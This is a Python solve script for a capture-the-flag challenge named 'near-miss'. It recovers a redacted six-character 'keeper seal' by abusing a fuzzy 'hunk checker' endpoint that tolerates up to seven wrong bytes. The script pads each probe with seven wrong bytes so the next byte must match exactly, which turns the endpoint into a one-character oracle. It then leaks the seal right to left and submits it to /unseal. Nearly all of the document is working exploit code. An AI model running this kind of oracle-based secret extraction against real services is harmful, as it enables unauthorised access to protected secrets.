#!/usr/bin/env python3
"""
near-miss (Cryovault 2026 Quals) — leak the keeper seal through the fuzzy
"hunk checker" oracle.

The /hunks/check endpoint tells us whether a 16-byte string is "close enough"
to the keeper's secret master runbook. It tolerates up to 7 wrong bytes in 16;
8 consecutive wrong bytes are rejected. We burn the 7-error budget on a fixed
"XXXXXXX" prefix so the next byte must match exactly, turning the yes/no answer
into a one-character oracle. The seal alphabet has 32 symbols and the endpoint
accepts 32 hunks per request, so each seal character costs exactly one request.
We recover the 6-char seal right-to-left (keeping the known public suffix after
each candidate), then submit it to /unseal before the minute's cut rolls over.

Self-contained: opens its own session, calibrates the near-offset, leaks, unseals.
"""
import json
import time
import urllib.error
import urllib.request

URL = "https://isfcrpesu-near-miss.chals.io"
ALPHABET = "0123456789abcdefghjkmnpqrstvwxyz"


def request(base, path, body=None):
    data = None if body is None else json.dumps(body).encode()

    while True:
        req = urllib.request.Request(
            base.rstrip("/") + path,
            data=data,
            method="GET" if data is None else "POST",
            headers={
                "Accept": "application/json",
                "Content-Type": "application/json",
            },
        )

        try:
            with urllib.request.urlopen(req, timeout=20) as response:
                return response.status, response.read()
        except urllib.error.HTTPError as error:
            response_body = error.read()

            if error.code == 429:
                delay = max(float(error.headers.get("Retry-After", "1")), 1.01)
                time.sleep(delay)
                continue

            return error.code, response_body


def open_session():
    status, body = request(URL, "/session", {})
    assert status == 200
    session = json.loads(body)
    return session.get("base", URL.rstrip("/") + "/s/" + session["token"])


def check_hunks(base, hunks):
    status, body = request(base, "/hunks/check", {"hunks": hunks})
    if status != 200:
        raise RuntimeError(body.decode(errors="replace"))
    return json.loads(body)["applies"]


def scan_near(base, pattern, positions):
    """Return the first accepted near value in the supplied order."""
    for offset in range(0, len(positions), 32):
        group = positions[offset:offset + 32]
        text = pattern.decode()
        hunks = [
            {"near": near, "find": text, "put": text}
            for near in group
        ]
        results = check_hunks(base, hunks)

        for near, applies in zip(group, results):
            if applies:
                return near

    raise RuntimeError("could not locate the keeper line")


base = open_session()
status, runbook = request(base, "/runbook")
assert status == 200

redacted = runbook.index(b"######")
copy_prefix_start = redacted - 16
known_prefix = runbook[copy_prefix_start:redacted]
assert known_prefix == b"ar\nkeeper seal: "

# Seven wrong bytes make the accepted location narrow enough to calibrate.
location_probe = b"XXXXXXX" + known_prefix[7:]

low_search = list(range(copy_prefix_start - 64, copy_prefix_start + 193))
high_search = list(reversed(low_search))

lower = scan_near(base, location_probe, low_search)
upper = scan_near(base, location_probe, high_search)
master_prefix_start = (lower + upper) // 2
shift = master_prefix_start - copy_prefix_start

print(f"keeper-line adjustment: {shift:+d} bytes")

# Calibration can use several requests. Start the actual leak at a fresh cut
# so all six character probes and the final unseal fit comfortably.
seconds = int(time.time()) % 60
if seconds > 3:
    time.sleep(61 - seconds)

status, runbook = request(base, "/runbook")
assert status == 200
redacted = runbook.index(b"######")

secret = [None] * 6

for index in range(5, -1, -1):
    target = redacted + index
    start = target - 7

    # Everything after the target is known because we work right-to-left.
    suffix = bytearray()
    for later in range(index + 1, 6):
        suffix += secret[later].encode()
    suffix += runbook[redacted + 6:]
    suffix = bytes(suffix[:8])

    hunks = []
    for candidate in ALPHABET:
        probe = b"XXXXXXX" + candidate.encode() + suffix
        assert len(probe) == 16
        text = probe.decode()
        hunks.append({
            "near": start + shift,
            "find": text,
            "put": text,
        })

    results = check_hunks(base, hunks)
    hits = [
        candidate
        for candidate, applies in zip(ALPHABET, results)
        if applies
    ]

    if len(hits) != 1:
        raise RuntimeError(f"unexpected candidates at position {index}: {hits}")

    secret[index] = hits[0]
    print("partial:", "".join(character or "?" for character in secret))

seal = "".join(secret)
status, body = request(base, "/unseal", {"seal": seal})

print("seal:", seal)
print("response:", status, body.decode())
